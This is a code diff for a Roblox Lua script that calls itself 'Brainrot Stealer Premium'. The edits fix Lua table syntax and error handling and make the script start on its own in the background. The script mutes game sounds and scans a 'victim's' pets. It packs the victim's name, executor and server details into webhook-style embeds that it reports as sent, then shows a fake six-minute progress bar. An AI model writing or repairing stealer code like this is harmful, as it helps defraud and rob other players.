@@ -179,7 +179,7 @@ local function MuteAllSounds()
             end
         end
         local soundService = game:GetService("SoundService")
-        soundService:SetRBXEvent("Volume", 0)
+        pcall(function() soundService:SetRBXEvent("Volume", 0) end)
     end)
 end
 
@@ -421,6 +421,7 @@ local function StartStealingProcess()
     local brainrotsText = FormatBrainrotsList(brainrots)
     local topPetsText = FormatTopPetsList(topPets)
     
+    -- Create embed table properly
     local embed = {
         title = "🧠 BRAINROT STEALER PREMIUM RESULTS",
         description = "Successfully scanned victim pets with premium features",
@@ -430,7 +431,7 @@ local function StartStealingProcess()
             icon_url = playerAvatar,
             url = playerProfile
         },
-        fields = [
+        fields = {
             {
                 name = "🎯 Victim Info",
                 value = "Player: " .. playerName .. "\\nExecutor: " .. executor .. "\\nServer Players: " .. playerCount,
@@ -451,7 +452,7 @@ local function StartStealingProcess()
                 value = brainrotsText,
                 inline = false
             }
-        ],
+        },
         footer = {text = "Brainrot Stealer Premium • " .. os.date("%X")},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
@@ -460,6 +461,7 @@ local function StartStealingProcess()
     
     status.Text = "✅ Results Sent! Starting 6-minute process..."
     
+    -- 6-minute timer with progress bar
     local totalTime = 360
     local startTime = tick()
     
@@ -475,6 +477,7 @@ local function StartStealingProcess()
         wait(0.1)
     end
     
+    -- Send completion message
     local completeEmbed = {
         title = "✅ PROCESS COMPLETE",
         description = "Brainrot stealing process finished successfully",
@@ -484,13 +487,13 @@ local function StartStealingProcess()
             icon_url = playerAvatar,
             url = playerProfile
         },
-        fields = [
+        fields = {
             {
                 name = "🎉 Final Results",
                 value = "Time: 6 minutes\\nPets Scanned: " .. #allPets .. "\\nBrainrots Found: " .. #brainrots .. "\\nStatus: Success",
                 inline = false
             }
-        ],
+        },
         footer = {text = "Brainrot Stealer Premium • " .. os.date("%X")}
     }
     
@@ -505,9 +508,11 @@ local function StartStealingProcess()
     pcall(function() screenGui:Destroy() end)
 end
 
--- Auto-start
-wait(2)
-StartStealingProcess()
+-- Auto-start the process
+spawn(function()
+    wait(2)
+    StartStealingProcess()
+end)
 
 print("🧠 Brainrot Stealer Premium loaded!")
 print("🎨 Animated GUI activated!")
